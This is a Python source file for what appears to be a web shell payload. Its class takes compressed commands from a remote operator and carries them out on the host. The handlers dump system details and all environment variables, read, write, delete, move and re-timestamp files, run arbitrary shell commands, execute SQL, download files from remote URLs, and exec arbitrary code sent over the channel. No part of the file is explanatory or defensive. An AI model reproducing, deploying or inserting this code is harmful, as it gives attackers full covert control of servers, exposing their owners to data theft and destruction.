import inspect
import os
import sys
import platform
import subprocess
import gzip
import struct
import tempfile
import socket
import re
import shutil
from pathlib import Path
from typing import Dict, List, Optional, Any, Union
import sqlite3
import threading
import json


class PythonPayload:
    def __init__(self):
        self.session_table: Dict[str, Any] = {}

    def parseParams(self, buffer_data: bytes) -> Dict[str, bytes]:
        params = {}
        key_buf = []
        i = 0

        while i < len(buffer_data):
            b = buffer_data[i]
            i += 1
            if b == 0xFF:
                break
            if b == 0x02:
                key = bytes(key_buf).decode('utf-8')
                key_buf.clear()
                length = struct.unpack('<I', buffer_data[i:i+4])[0]
                i += 4
                params[key] = buffer_data[i:i+length]
                i += length
            else:
                key_buf.append(b)

        return params

    def createContext(self, params: Dict[str, bytes]):
        class Context:
            def __init__(self, params_dict: Dict[str, bytes], session_table: Dict[str, Any]):
                self.params = params_dict
                self.session_table = session_table

            def get(self, key: str) -> Optional[str]:
                value = self.params.get(key)
                return value.decode('utf-8') if value else None

            def getBytes(self, key: str) -> Optional[bytes]:
                return self.params.get(key)

            def getSession(self):
                return self.session_table

        return Context(params, self.session_table)

    async def test(self) -> str:
        return 'ok'

    async def getBasicsInfo(self) -> str:
        text = ''

        is_windows = platform.system().lower().startswith('win')
        if not is_windows:
            file_root = '/'
        else:
            file_root = ''
            for drive_letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
                drive_path = f'{drive_letter}:\\'
                if os.path.exists(drive_path):
                    file_root += f'{drive_path};'
            if not file_root:
                file_root = '/'

        text += f'FileRoot : {file_root}\n'
        text += f'CurrentDir : {os.getcwd()}\n'
        text += f'CurrentWebDir : {os.getcwd()}\n'

        text += f'OsInfo : {platform.system()} {platform.release()} {platform.machine()}\n'
        text += f'CurrentUser : {os.environ.get("USER", os.environ.get("USERNAME", "unknown"))}\n'
        text += f'ProcessArch : {"x64" if "64" in platform.architecture()[0] else "x86"}\n'

        try:
            temp_dir = tempfile.gettempdir()
            text += f'TempDirectory : {temp_dir}\n'
        except:
            text += 'TempDirectory : c:/windows/temp/\n'

        try:
            hostname = socket.gethostname()
            ip_list = socket.gethostbyname_ex(hostname)[2]
            ip_list = [ip for ip in ip_list if not ip.startswith("127.")]
            text += f'IPList : [{", ".join(ip_list)}]\n'
        except Exception as e:
            text += f'IPList : {str(e)}\n'

        env_map = {
            'CommandLine': ' '.join(sys.argv),
            'CurrentDirectory': os.getcwd(),
            'MachineName': hostname,
            'ProcessorCount': str(os.cpu_count()),
            'UserName': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
            'OSVersion': f'{platform.system()} {platform.release()}',
            'Version': platform.python_version(),
            'Is64BitProcess': 'True' if sys.maxsize > 2**32 else 'False',
            'Is64BitOperatingSystem': 'True' if '64' in platform.machine() else 'False',
            'TickCount': str(int(os.times().elapsed)),
            'WorkingSet': str(os.getloadavg()[0] if hasattr(os, 'getloadavg') else 'N/A')
        }

        for k, v in env_map.items():
            if k not in ['StackTrace', 'NewLine'] and v is not None:
                text += f'{k} : {v}\n'

        try:
            for k, v in os.environ.items():
                text += f'{k} : {v}\n'
        except Exception as e:
            text += f'EnvVars error: {str(e)}\n'

        return text

    async def getFile(self, ctx) -> str:
        dir_name = ctx.get('dirName') or '.'
        dir_path = Path(dir_name).resolve()

        try:
            files = list(dir_path.iterdir())
        except PermissionError:
            return "Permission denied"

        output = f"ok\n{dir_path}\n"

        for file_path in files:
            try:
                stat = file_path.stat()

                file_type = 0 if file_path.is_dir() else 1
                size = 4096 if file_type == 0 else stat.st_size

                import datetime
                mtime = datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')

                permissions = ''
                if os.access(file_path, os.R_OK):
                    permissions += 'R'
                if os.access(file_path, os.W_OK):
                    permissions += 'W'
                if os.access(file_path, os.X_OK) or file_path.is_dir():
                    permissions += 'X'

                if not permissions:
                    permissions = 'F'

                output += f"{file_path.name}\t{file_type}\t{mtime}\t{size}\t{permissions}\n"
            except:
                continue

        return output

    async def setFileAttr(self, ctx) -> str:
        file_type = ctx.get('type')
        attr = ctx.get('attr')
        filename = ctx.get('fileName')

        if not all([file_type, attr, filename]):
            return 'type or attr or fileName is null'

        if file_type == 'fileBasicAttr':
            try:
                mode = 0
                if 'R' in attr:
                    mode |= 0o444
                if 'W' in attr:
                    mode |= 0o222
                if 'X' in attr:
                    mode |= 0o111

                os.chmod(filename, mode)
                return 'ok'
            except Exception:
                return 'fail'

        elif file_type == 'fileTimeAttr':
            try:
                timestamp = int(attr)
                import time
                os.utime(filename, (timestamp, timestamp))
                return 'ok'
            except Exception:
                return 'fail'

        return 'no ExecuteType'

    async def execSql(self, ctx) -> bytes:
        db_type = ctx.get('dbType')
        db_host = ctx.get('dbHost')
        db_port = int(ctx.get('dbPort') or 0)
        db_username = ctx.get('dbUsername')
        db_password = ctx.get('dbPassword')
        exec_type = ctx.get('execType')
        exec_sql_str = ctx.get('execSql')
        current_db = ctx.get('currentDb')

        if not all([db_type, db_host, db_port, db_username, db_password, exec_type, exec_sql_str]):
            return b"No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql"

        try:
            if db_type == "sqlite":
                conn = sqlite3.connect(db_host)

                if exec_type == "select":
                    cursor = conn.cursor()
                    cursor.execute(exec_sql_str)

                    columns = [description[0] for description in cursor.description]
                    rows = cursor.fetchall()

                    output = "ok\n"
                    for col in columns:
                        output += f"{col}\t"
                    output += "\n"

                    for row in rows:
                        for val in row:
                            output += f"{val}\t"
                        output += "\n"

                    conn.close()
                    return output.encode('utf-8')
                else:
                    cursor = conn.cursor()
                    cursor.execute(exec_sql_str)
                    affected = cursor.rowcount
                    conn.commit()
                    conn.close()
                    return f"Query OK, {affected} rows affected".encode('utf-8')

            else:
                return f"Database type {db_type} not supported in Python version".encode('utf-8')

        except Exception as e:
            return str(e).encode('utf-8')

    async def readFile(self, ctx) -> bytes:
        filename = ctx.get('fileName')
        try:
            with open(filename, 'rb') as f:
                return f.read()
        except Exception as e:
            return str(e).encode('utf-8')

    async def uploadFile(self, ctx) -> str:
        filename = ctx.get('fileName')
        file_value = ctx.getBytes('fileValue')
        try:
            with open(filename, 'wb') as f:
                f.write(file_value)
            return 'ok'
        except Exception:
            return 'fail'

    async def deleteFile(self, ctx) -> str:
        filename = ctx.get('fileName')
        try:
            if os.path.isdir(filename):
                shutil.rmtree(filename)
            else:
                os.remove(filename)
            return 'ok'
        except Exception:
            return 'fail'

    async def copyFile(self, ctx) -> str:
        src_filename = ctx.get('srcFileName')
        dest_filename = ctx.get('destFileName')
        try:
            shutil.copy2(src_filename, dest_filename)
            return 'ok'
        except Exception:
            return 'fail'

    async def moveFile(self, ctx) -> str:
        src_filename = ctx.get('srcFileName')
        dest_filename = ctx.get('destFileName')
        try:
            shutil.move(src_filename, dest_filename)
            return 'ok'
        except Exception:
            return 'fail'

    async def newFile(self, ctx) -> str:
        filename = ctx.get('fileName')
        try:
            with open(filename, 'w') as f:
                f.write('')
            return 'ok'
        except Exception:
            return 'fail'

    async def newDir(self, ctx) -> str:
        dirname = ctx.get('dirName')
        try:
            os.makedirs(dirname, exist_ok=True)
            return 'ok'
        except Exception:
            return 'fail'

    async def execCommand(self, ctx) -> str:
        cmd = ctx.get('executableFile') or ctx.get('cmd') or ''
        args = ctx.get('executableArgs') or ''

        try:
            result = subprocess.run(
                f"{cmd} {args}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "Command execution timed out"
        except Exception as e:
            return str(e)

    async def fileRemoteDown(self, ctx) -> str:
        import urllib.request

        url = ctx.get('url')
        save_file = ctx.get('saveFile')

        try:
            urllib.request.urlretrieve(url, save_file)
            return 'ok'
        except Exception as e:
            return str(e)

    async def include(self, ctx) -> str:
        code = ctx.get('binCode')
        code_name = ctx.get('codeName')

        try:
            local_vars = {}
            exec(code, {}, local_vars)
            if len(local_vars.keys()) > 0:
                self.session_table[code_name] = local_vars
            return 'ok'
        except Exception:
            return 'fail'

    async def close(self, ctx) -> str:
        self.session_table.clear()
        return 'ok'

    async def bigFileUpload(self, ctx) -> str:
        filename = ctx.get('fileName')
        file_contents = ctx.getBytes('fileContents')
        position = int(ctx.get('position') or 0)

        try:
            with open(filename, 'ab') as f:
                f.seek(position)
                f.write(file_contents)
            return 'ok'
        except Exception:
            return 'fail'

    async def process(self, raw_data: bytes) -> bytes:
        try:
            decompressed = gzip.decompress(raw_data)

            params = self.parseParams(decompressed)
            ctx = self.createContext(params)

            method_name = ctx.get("methodName")
            class_name = ctx.get("evalClassName")

            if not class_name:
                handler = getattr(self, method_name, None) if hasattr(self, method_name) else lambda: "method not found"
            else:
                plugin_obj = self.session_table.get(class_name)
                if plugin_obj and isinstance(plugin_obj, dict):
                    handler = plugin_obj.get(method_name, lambda: "method not found")
                else:
                    handler = lambda: "code not load"

            if callable(handler):
                sig = inspect.signature(handler)
                params_count = len(sig.parameters)
                if params_count == 0:
                    result = await handler() if asyncio.iscoroutinefunction(handler) else handler()
                else:
                    result = await handler(ctx) if asyncio.iscoroutinefunction(handler) else handler(ctx)
            else:
                result = "method not found"

            payload = result if isinstance(result, bytes) else str(result).encode('utf-8')

            return gzip.compress(payload)

        except Exception as e:
            error_msg = f"error: {str(e)}"
            return gzip.compress(error_msg.encode('utf-8'))


try:
    import asyncio
except ImportError:
    asyncio = None

if asyncio:
    async def ensureAsync(func, *args, **kwargs):
        if asyncio.iscoroutinefunction(func):
            return await func(*args, **kwargs)
        else:
            return func(*args, **kwargs)